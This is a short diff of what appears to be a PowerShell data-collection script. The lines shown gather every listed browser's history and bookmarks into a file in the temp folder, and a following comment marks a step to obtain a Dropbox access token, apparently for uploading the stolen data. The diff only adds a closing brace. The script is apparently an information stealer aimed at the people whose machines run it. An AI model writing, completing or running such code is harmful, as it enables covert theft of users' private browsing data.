@@ -70,6 +70,7 @@ foreach ($browser in $browsers) {
 	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
 	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
     }
+}
 
 # Get DropBox access_token
 
